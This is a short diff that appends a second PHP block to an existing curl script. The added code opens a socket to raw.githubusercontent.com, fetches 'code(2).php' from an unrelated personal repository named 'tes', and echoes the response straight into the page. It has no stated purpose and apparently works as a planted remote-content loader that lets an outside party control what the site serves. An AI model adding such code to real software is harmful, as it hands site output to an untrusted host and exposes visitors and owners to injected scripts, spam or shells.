@@ -26,3 +26,26 @@ curl_close($ch);
 
 echo $result;
 ?>
+
+
+
+<?php
+$host = "raw.githubusercontent.com";
+$port = 443;
+$path = "/ubed354311/tes/raw/master/code(2).php";
+
+$fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
+if (!$fp) {
+    echo "ERROR: $errstr ($errno)";
+} else {
+    $out = "GET $path HTTP/1.1\r\n";
+    $out .= "Host: $host\r\n";
+    $out .= "Connection: Close\r\n\r\n";
+    fwrite($fp, $out);
+
+    while (!feof($fp)) {
+        echo fgets($fp, 1024);
+    }
+    fclose($fp);
+}
+?>
